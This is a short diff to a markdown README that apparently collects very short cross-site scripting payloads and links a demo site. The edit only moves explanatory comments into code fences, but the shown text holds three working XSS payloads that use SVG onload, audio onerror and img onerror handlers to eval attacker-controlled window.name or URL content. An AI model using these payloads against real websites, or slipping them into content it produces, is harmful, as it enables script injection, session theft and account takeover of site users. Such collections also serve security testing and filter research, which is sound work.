@@ -25,13 +25,13 @@ The DEMO available here: <https://tinyxss.terjanq.me>
 <svg><svg/onload=eval(name)>
 ```
 
-<!-- If you control window's name, this payload is that it will work inside innerHTML on elements not yet inserted into the DOM -->
 ```html
+<!-- If you control window's name, this payload is that it will work inside innerHTML on elements not yet inserted into the DOM -->
 <audio/src/onerror=eval(name)>
 ```
 
-<!-- If you control the URL, this payload is that it will work inside innerHTML on elements not yet inserted into the DOM -->
 ```html
+<!-- If you control the URL, this payload is that it will work inside innerHTML on elements not yet inserted into the DOM -->
 <img/src/onerror=eval(`'`+URL)>
 ```
 
